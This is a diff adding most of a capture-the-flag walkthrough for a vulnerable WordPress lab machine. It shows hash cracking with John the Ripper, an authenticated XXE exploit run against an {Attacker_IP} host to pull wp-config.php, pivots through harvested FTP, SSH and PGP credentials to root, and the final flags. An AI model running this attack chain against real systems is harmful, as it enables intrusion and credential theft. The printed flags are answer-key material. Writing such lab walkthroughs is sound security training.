@@ -47,8 +47,7 @@ After navigating to wp-admin we find that it requires a login. We try default pa
 We type the following command to run the wordpress security scan.
 
 **Command:**\
-*wpscan --url metapress.htb --api-token {Your API-token}
-*
+*wpscan --url metapress.htb --api-token {Your API-token}*
 
 **Results:**\
 We find a possible vulnerability "Authenticated XXE Within the Media Library Affecting PHP 8" for WordPress versions 5.6-5.7. The WordPress version of the webserver found was 5.6.2.
@@ -153,10 +152,162 @@ To make it more visible we can use this command instead to get the username and 
 
 ![image](https://user-images.githubusercontent.com/85443537/226911825-bb904bc3-cf60-4910-9583-c5dc56882d7a.png)
 
-We 
+We save both hashes into a file called php-hashes.
+
+![image](https://user-images.githubusercontent.com/85443537/226913360-b104a404-9100-4da0-8ad5-8c0c5acf2ee8.png)'
 
 
+## Cracking the passwords using John The Ripper (john)
+
+Use the following command to crack the passwords.
+
+**Command:**\
+*john -w=/usr/share/wordlists/rockyou.txt php-hashes*
+
+**Results:**\
+We get the password for the *manager* which is *partylikearockstar*
+
+![image](https://user-images.githubusercontent.com/85443537/226914132-25ec1c4b-0fb8-4d43-9196-748acae9b051.png)
+
+## Logging in
+
+We can now use one of the cracked credentials from previous section and login into the admin panel on metapress.htb/wp-login.
+
+![image](https://user-images.githubusercontent.com/85443537/226914629-85e86a0d-09b4-4c63-b296-37c62f47b3c5.png)
 
 
+## Exploiting Authenticated XXE Within the Media Library Affecting PHP 8
 
+We can now fully exploit the *Authenticated XXE Within the Media Library Affecting PHP 8* vulnerability that we found previously using wpscan since we are now authenticated.
+
+We find the CVE on exploit-db.com (WordPress 5.7 - 'Media Library' XML External Entity Injection (XXE) (Authenticated)). We then copy and paste the code into a new file and call it *xxe.sh*.
+
+![image](https://user-images.githubusercontent.com/85443537/226915959-e7cc6d8e-34c6-4ae2-8b1f-bab11ef03c71.png)
+
+We then run the bash file (our exploit) we created and request the *wp-config.php* file using the following command:
+
+Usage:
+
+![image](https://user-images.githubusercontent.com/85443537/226917233-11fceba6-b8ba-43cd-a1d3-6bb3554432f9.png)
+
+**Command:**\
+*bash xxe.sh manager partylikearockstar ../wp-config.php {Attacker_IP}*
+
+**Results:**\
+We find some FTP credentials.
+
+![image](https://user-images.githubusercontent.com/85443537/226917659-df9370b3-480f-46c1-b109-ecd8d1ccf5d3.png)
+
+## Logging in to FTP
+
+Now that we aquired some FTP credentials and we know that port 21 for FTP is open. We can login with the information.
+FTP_USER: metapress.htb
+FTP_PASS: 9NYS_ii@FyL_p5M2NvJ
+
+Use the command:
+
+*ftp metapress.htb@{Target_IP}*
+
+Once logged in, there will be 2 directories.
+
+![image](https://user-images.githubusercontent.com/85443537/226919083-82aac865-19f7-4836-8023-f8aea6a2a7f2.png)
+
+Navigating to the mailer directory we find two other files.
+
+![image](https://user-images.githubusercontent.com/85443537/226919594-a04894ad-b39c-4e12-a6c0-a906b4db9b40.png)
+
+We check the content of *send_email.php* and find some credentials.\
+Username = "jnelson@metapress.htb";\             
+Password = "Cb4_JmWM8zUZWMu@Ys";  
+
+![image](https://user-images.githubusercontent.com/85443537/226919791-ad886e48-7f80-452b-9152-e94ef871eece.png)
+
+## SSH Session
+
+Once we recieved the credentials from previous section from the FTP session. We try to log with ssh using the credentials.
+*ssh jnelson@{Target_IP}*
+
+We get a shell.
+
+We find the user.txt flag.
+
+Now run the following command to show all files (including hidden files):
+*ls -la*
+
+We find a hidden directory called *.passpie* which the user jnelson have access too.
+
+In the *ssh* directory we also find two files *jnelson.pass* and *root.pass*.
+We are interested in the *root.pass*.
+
+![image](https://user-images.githubusercontent.com/85443537/226926279-7c8ba7d7-2309-49a0-b019-a03d1d533e0e.png)
+
+We copy only the data thats after the *password* field and paste it into another file (encryptedpgp).
+
+-----BEGIN PGP MESSAGE-----
+
+
+  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+
+  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+
+  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+
+  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+
+  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+
+  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+
+  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+
+  lpF0RatbxQGWBks5F3o=
+
+  =uh1B
+
+  -----END PGP MESSAGE-----
+
+
+Navigating to the hidden directory and typing the command *ls -la* we find another hidden file called *.keys*.
+We extract and copy the PGP PRIVATE KEY BLOCK into another file called *privkey*.
+
+![image](https://user-images.githubusercontent.com/85443537/226922484-8891c7b5-246f-45f6-b09b-3bbb5443777d.png)
+
+Now we can attempt to crack the password by first turning it into a format that John the Ripper can handle.
+We type the following command to do that:
+
+*/usr/sbin/gpg2john privkey > privkeyhash*
+
+We then crack the password using the following command:
+
+*john -w=/usr/share/wordlists/rockyou.txt privkeyhash*
+
+The cracked password is *blink182*.
+
+Once the password is cracked we can proceed to import the private key using the following command:
+
+*gpg --import privkey*
+ 
+And then we can list the keys:
+
+*gpg --list-secret-keys*
+
+![image](https://user-images.githubusercontent.com/85443537/226925514-05e22264-c474-40d9-88d9-c8a80803dff0.png)
+
+Once we have that imported we can try to decrypt the encrypted password found in the *root.pass* file.
+We type the following command to decrypt the password we saved in the *encryptedpgp* file:
+
+*gpg --output decryptedpgp --decrypt encryptedpgp*
+
+Looking at the newly generated decrypted file we get the password *p7qfAZt4_A1xo_0x*.
+
+We change the user in current session to root using the *su root* command and then type the decrypted password.
+We then become root and can get the *root.txt* flag.
+
+![image](https://user-images.githubusercontent.com/85443537/226928486-d53d6854-c78e-4516-80c5-ed0b3460ed0c.png)
+
+
+# Goals
+
+* USER FLAG: 8f6970dd94ee32701025173ee96cf76f
+* ROOT FLAG: 6c752d9907b5e1591e36076f247d901c
 
